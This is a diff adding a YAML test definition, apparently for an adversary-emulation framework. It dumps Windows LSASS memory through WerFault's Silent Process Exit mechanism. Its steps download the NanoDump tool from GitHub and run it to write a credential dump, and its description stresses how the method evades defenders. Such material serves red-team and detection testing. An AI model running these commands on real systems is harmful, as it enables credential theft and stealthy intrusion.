@@ -1,0 +1,35 @@
+api_version: "2.0"
+name: Dump LSASS.exe Memory through Silent Process Exit
+description: "WerFault.exe (Windows Error Reporting process that handles process crashes) can be abused to create a \nmemory dump of lsass.exe, in a directory of your choice. This method relies on a mechanism \nintroduced in Windows 7 called Silent Process Exit, which provides the ability to trigger\nspecific actions for a monitored process in one of two scenarios; either the process terminates\nitself by calling ExitProcess(), or another process terminates it via the TerminateProcess() API. \nThe major advantage of this technique is that it does not cause lsass.exe to crash, and since \nWerFault.exe is used to create file dumps all the time (not just lsass.exe), this method provides \nthe added advantage of going undetected. WerFault.exe is a process known for dumping every crashing process, \nfrom an attacker standpoint this is appealing as their illicit credential extraction will \nappear benign because from a defender’s viewpoint it’s within the realm of normal activity.\n\nUpon successful execution, you should find the dump file in directory of your choice or \"%temp%\\SilentProcessExit\" by default.\n"
+args:
+    - name: output_folder
+      type: path
+      default: '%temp%\SilentProcessExit'
+uuid: eb5adf16-b601-4926-bca7-dad22adffb37
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+    subtechniques:
+        - 'T1003.001: LSASS Memory'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe)
+      inline: |
+        if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe) {exit 0} else {{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest "https://github.com/fortra/nanodump/blob/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe"
+        }}
+      executor: powershell
+    - name: dump-lsass.exe-memory-through-silent-process-exit
+      inline: |
+        PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit "{{.Args.output_folder}}"
+      executor: command_prompt
+      cleanup:
+        inline: |
+            rmdir "{{.Args.output_folder}}" /s /q >nul 2> nul
+        executor: command_prompt
